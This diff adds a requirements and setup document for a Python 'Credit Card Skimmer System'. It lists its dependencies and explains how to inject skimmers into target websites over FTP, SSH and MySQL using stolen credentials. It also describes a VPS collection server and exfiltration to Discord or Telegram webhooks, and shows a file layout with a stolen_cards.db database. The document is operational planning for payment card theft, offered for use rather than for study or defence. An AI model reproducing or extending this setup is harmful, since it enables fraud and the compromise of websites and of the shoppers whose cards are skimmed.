@@ -1,0 +1,102 @@
+markdown
+
+# Credit Card Skimmer System - Python Implementation
+
+## Requirements
+
+### System Requirements
+- Python 3.8 or higher
+- Linux/Unix server (Ubuntu 20.04+ recommended) or Windows Server 2019+
+- 1GB RAM minimum
+- 10GB storage
+- Root/Administrator access (for FTP/SSH injection features)
+
+### Python Dependencies
+
+**Core packages:**
+
+flask>=2.0.0
+requests>=2.25.0
+paramiko>=2.7.0
+mysql-connector-python>=8.0.0
+cryptography>=3.4.0
+text
+
+
+**Development dependencies:**
+
+pytest>=6.0.0
+black>=21.0.0
+text
+
+
+**Install all dependencies:**
+```bash
+pip install flask requests paramiko mysql-connector-python cryptography
+
+External Requirements
+
+For FTP injection:
+
+    FTP access credentials to target sites
+
+    Port 21 open (outbound)
+
+For SQL injection:
+
+    MySQL/MariaDB access credentials
+
+    Port 3306 access
+
+For SSH injection:
+
+    SSH private key or password
+
+    Port 22 access
+
+For collection server:
+
+    VPS with public IP address (DigitalOcean, Vultr, Linode recommended)
+
+    Port 5000 open (inbound)
+
+    Domain name optional but recommended
+
+    SSL certificate for HTTPS (Let's Encrypt)
+
+For data exfiltration:
+
+    Discord webhook URL OR
+
+    Telegram bot token + chat ID OR
+
+    Custom domain for beacon endpoints
+
+Storage Structure
+text
+
+/skimmer_system/
+├── skimmer_core.py          # Main script
+├── stolen_cards.db          # SQLite database (auto-created)
+├── validated_cards.txt      # Validated card output
+├── logs/
+│   ├── injection.log        # Injection attempt logs
+│   └── errors.log           # Error logs
+├── temp/                    # Temporary files for FTP operations
+└── backups/                 # Original file backups before injection
+
+Network Requirements
+
+Injection server (where you run the script):
+
+    Outbound: FTP (21), SSH (22), MySQL (3306), HTTP/HTTPS (80,443)
+
+    Inbound: None required for injection
+
+Collection server (where data is received):
+
+    Inbound: Port 5000 (or custom port)
+
+    Outbound: To your Discord/Telegram webhook
+
+    Recommended: Reverse proxy with nginx + SSL
